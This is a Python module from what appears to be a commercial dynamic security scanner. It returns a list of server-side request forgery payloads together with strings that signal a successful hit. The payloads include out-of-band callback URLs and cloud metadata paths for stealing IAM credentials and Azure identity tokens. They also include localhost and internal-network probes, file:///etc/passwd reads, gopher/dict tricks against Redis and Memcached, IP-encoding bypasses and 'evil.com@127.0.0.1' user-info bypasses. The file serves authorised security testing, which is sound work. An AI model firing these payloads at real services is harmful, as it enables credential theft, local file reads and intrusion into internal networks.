"""
DevSecure360 — DAST SSRF Payloads (Enterprise Edition)
========================================================
Server-Side Request Forgery payload set targeting cloud metadata, localhost, 
internal networks, and alternative protocol handlers.
Sources: OWASP WSTG-INPV-19, PayloadsAllTheThings SSRF corpus, HackerOne SSRF reports.
"""


def get_payloads(oob_host: str, canary_id: str) -> list:
    """
    Enterprise SSRF payload set.
    - OOB callback payloads (primary confirmation)
    - Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean, Alibaba)
    - Localhost probing (internal service discovery)
    - Alternative protocol handlers (dict://, gopher://, file://)
    - IP encoding bypass (decimal, hex, octal)
    """
    return [
        # ── OOB callback — primary confirmation ───────────────────────────────
        f"http://{oob_host}/{canary_id}",
        f"https://{oob_host}/{canary_id}",
        f"http://{oob_host}:80/{canary_id}",

        # ── AWS EC2 Instance Metadata Service (IMDS v1) ───────────────────────
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",

        # ── GCP Metadata ──────────────────────────────────────────────────────
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",

        # ── Azure Metadata ────────────────────────────────────────────────────
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",

        # ── DigitalOcean Metadata ─────────────────────────────────────────────
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/v1/",

        # ── Alibaba Cloud Metadata ─────────────────────────────────────────────
        "http://100.100.100.200/latest/meta-data/",

        # ── Localhost probing (internal service discovery) ─────────────────────
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8443/",
        "http://127.0.0.1:3000/",
        "http://127.0.0.1:5000/",
        "http://127.0.0.1:9200/",    # Elasticsearch
        "http://127.0.0.1:6379/",    # Redis
        "http://127.0.0.1:27017/",   # MongoDB
        "http://0.0.0.0/",

        # ── Internal RFC-1918 network ranges ──────────────────────────────────
        "http://192.168.1.1/",
        "http://192.168.0.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://10.0.0.138/",

        # ── Alternative protocol handlers (bypass URL scheme whitelists) ───────
        "file:///etc/passwd",
        "file:///C:/Windows/win.ini",
        "dict://127.0.0.1:11211/stats",      # Memcached
        f"gopher://127.0.0.1:6379/_INFO\r\n",  # Redis via gopher
        "ftp://127.0.0.1:21/",

        # ── IP encoding bypass tricks ──────────────────────────────────────────
        f"http://127.1/{canary_id}",                # Shorthand
        f"http://2130706433/{canary_id}",            # 127.0.0.1 in decimal
        f"http://0x7f000001/{canary_id}",            # 127.0.0.1 in hex
        f"http://0177.0.0.1/{canary_id}",            # 127.0.0.1 in octal
        f"http://127.0.0.1.nip.io/{canary_id}",     # DNS rebinding
        f"http://localhost.127.0.0.1.nip.io/{canary_id}",

        # ── IPv6 localhost ────────────────────────────────────────────────────
        "http://[::1]/",
        "http://[::ffff:127.0.0.1]/",
        f"http://[::1]/{canary_id}",

        # ── URL bypass with @ (user info injection) ───────────────────────────
        f"http://evil.com@127.0.0.1/{canary_id}",
        f"http://127.0.0.1 @evil.com/{canary_id}",
    ]


INTERNAL_ORACLE_STRINGS = [
    # AWS metadata responses
    "ami-id", "instance-id", "security-credentials", "local-hostname",
    "instance-type", "mac", "placement",
    # GCP metadata
    "computeMetadata", "serviceAccounts", "projectId", "numericProjectId",
    # Azure metadata
    "subscriptionId", "vmId", "resourceGroupName",
    # Internal service responses
    "Redis version", "elasticsearch", "mongodb",
    "Memcached", "+PONG",
    # Generic internal indicators
    "Welcome to nginx", "Apache/2", "It works!",
    # File read via SSRF
    "root:x:0:0:", "/bin/bash",
    # Internal error pages
    "Internal Server Error", "localhost refused",
]
